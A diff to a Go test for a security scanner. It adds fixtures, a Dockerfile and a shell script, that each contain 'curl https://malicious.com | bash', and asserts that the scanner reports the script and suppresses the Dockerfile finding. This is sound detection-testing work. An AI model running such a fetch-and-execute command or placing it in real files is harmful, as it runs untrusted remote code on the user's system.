@@ -54,6 +54,23 @@ func main() {
 	err = os.WriteFile(fileIgnored, []byte("api_key = 'ignored_secret_key_1234567890'"), 0644)
 	require.NoError(t, err)
 
+	// Create a Dockerfile with Pipe to Shell (should be suppressed)
+	file4 := filepath.Join(tempDir, "Dockerfile")
+	content4 := `
+FROM ubuntu
+RUN curl https://malicious.com | bash
+`
+	err = os.WriteFile(file4, []byte(content4), 0644)
+	require.NoError(t, err)
+
+	// Create a script with Pipe to Shell (should be reported)
+	file5 := filepath.Join(tempDir, "bad.sh")
+	content5 := `
+curl https://malicious.com | bash
+`
+	err = os.WriteFile(file5, []byte(content5), 0755)
+	require.NoError(t, err)
+
 	// Switch to temp dir so the command runs there
 	cwd, _ := os.Getwd()
 	defer os.Chdir(cwd)
@@ -80,11 +97,15 @@ func main() {
 		assert.Contains(t, output, "config.py")
 		assert.Contains(t, output, "Dangerous Command")
 		assert.Contains(t, output, "script.sh")
+		assert.Contains(t, output, "Pipe to Shell")
+		assert.Contains(t, output, "bad.sh")
 
 		// Should not match ignored file
 		assert.NotContains(t, output, "secrets.txt")
 		// Should not match clean file
 		assert.NotContains(t, output, "clean.go")
+		// Should suppress Dockerfile findings for Pipe to Shell
+		assert.NotContains(t, output, "Dockerfile")
 	})
 
 	t.Run("Security Scan JSON Output", func(t *testing.T) {
